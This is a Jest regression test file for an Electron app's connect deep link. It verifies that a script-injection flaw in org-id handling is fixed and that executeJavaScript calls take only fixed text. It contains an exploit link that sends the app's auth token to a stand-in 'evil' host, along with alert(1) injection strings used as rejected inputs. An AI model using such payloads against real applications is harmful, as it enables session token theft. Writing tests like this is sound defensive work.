'use strict';

/**
 * lana-ai://connect/<org-id> (electron-main.js handleConnectLink). The org id came
 * from any website that opens the link; it used to be spliced into
 * executeJavaScript inside '...', so a quote ran script in the app window with
 * the full preload (token, saveSettings). Now the id must match the org id
 * pattern and reaches the sign-in page as data over IPC.
 */

const fs = require('fs');
const path = require('path');
const { connectLinkOrgId } = require('../../electron-app-links');

const ROOT = path.join(__dirname, '..', '..');
const read = (file) => fs.readFileSync(path.join(ROOT, file), 'utf8');

const EXPLOIT = "lana-ai://connect/x';location='https://evil/?'+lanaAuthToken.get();'";

describe('connectLinkOrgId', () => {
  test('a real org id is accepted (trimmed, lowercased)', () => {
    expect(connectLinkOrgId(new URL('lana-ai://connect/smithlaw'))).toBe('smithlaw');
    expect(connectLinkOrgId(new URL('lana-ai://connect/Smith-Law-2'))).toBe('smith-law-2');
    expect(connectLinkOrgId(new URL('lana-ai://connect/smithlaw/'))).toBe('smithlaw');
  });

  test('the exploit link and anything with quotes or script is refused', () => {
    expect(connectLinkOrgId(new URL(EXPLOIT))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/x"onload="alert(1)'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/x%27;alert(1)//'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/a/b'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/'))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/' + 'a'.repeat(101)))).toBe(null);
    expect(connectLinkOrgId(new URL('lana-ai://connect/%E0%A4%A'))).toBe(null);
  });
});

describe('no page script is built from outside input', () => {
  const MAIN_PROCESS_FILES = fs.readdirSync(ROOT).filter((name) => /^electron-.*\.js$/.test(name))
    .concat(['src/screen-voice/electron-screen-voice.js', 'js/session/session-tracker.js']);

  test.each(MAIN_PROCESS_FILES)('%s: executeJavaScript and insertCSS take only fixed text', (file) => {
    const source = read(file);
    const calls = [...source.matchAll(/\.(executeJavaScript|insertCSS)\(\s*([`'"])/g)].map((m) => {
      const start = m.index + m[0].length - 1;
      const quote = m[2];
      const end = source.indexOf(quote, start + 1);
      return { kind: m[1], text: source.slice(start, end + 1) };
    });
    // No template interpolation and no string concatenation into the script.
    for (const call of calls) {
      expect({ file, call: call.text.includes('${') }).toEqual({ file, call: false });
    }
    // Every call starts with a literal (a variable could carry outside input).
    const all = (source.match(/\.(executeJavaScript|insertCSS)\(/g) || []).length;
    expect({ file, nonLiteral: all - calls.length }).toEqual({ file, nonLiteral: 0 });
  });

  test('the connect link fills the sign-in page through IPC', () => {
    const main = read('electron-main.js');
    const handler = main.slice(main.indexOf('const handleConnectLink'), main.indexOf('};', main.indexOf('const handleConnectLink')));
    expect(handler).not.toMatch(/executeJavaScript/);
    expect(handler).toMatch(/connectLinkOrgId\(urlObj\)/);
    expect(handler).toMatch(/webContents\.send\('connect-link:org', \{ orgId \}\)/);
    expect(read('electron-preload.js')).toMatch(/onConnectOrg: \(callback\) =>/);
    expect(read('src/login.html')).toMatch(/electronAPI\.onConnectOrg\(/);
  });
});
